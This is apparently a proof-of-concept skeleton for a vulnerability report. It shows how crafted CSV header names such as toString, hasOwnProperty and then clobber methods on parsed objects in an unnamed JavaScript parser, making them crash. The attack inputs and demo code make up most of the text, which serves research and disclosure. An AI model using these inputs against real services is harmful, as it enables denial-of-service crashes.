# PoC Skeleton -- Method Clobbering

## CSV Header Clobbering

```js
/**
 * CVE-CANDIDATE: Method Clobbering via CSV Headers in [package]
 * CWE: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
 * CVSS: 7.5 HIGH
 */
const { parse } = require('[package-name]');

// CSV with malicious header names
const csv = `toString,valueOf,hasOwnProperty
1,2,3`;

const result = parse(csv, { columns: true });
const row = result[0];

// Demonstrate crash
try {
  row.toString();  // TypeError: row.toString is not a function
} catch (e) {
  console.log('[+] toString clobbered:', e.message);
}

try {
  JSON.stringify(row);  // May fail if toJSON is clobbered
} catch (e) {
  console.log('[+] JSON.stringify crash:', e.message);
}

try {
  row.hasOwnProperty('toString');  // TypeError
} catch (e) {
  console.log('[+] hasOwnProperty clobbered:', e.message);
}
```

## Thenable Confusion

```js
const csv = `then,catch
function(){return process},1`;

const result = parse(csv, { columns: true });
const row = result[0];

// If code does: await Promise.resolve(row)
// It will call row.then(), which is now a string value
// This causes unexpected behavior or TypeError
```

## Form Data Clobbering

```js
const formData = {
  'toString': 'not-a-function',
  'constructor': 'overwritten'
};

// Parser creates: { toString: 'not-a-function', constructor: 'overwritten' }
// Any code calling obj.toString() on this will crash
```
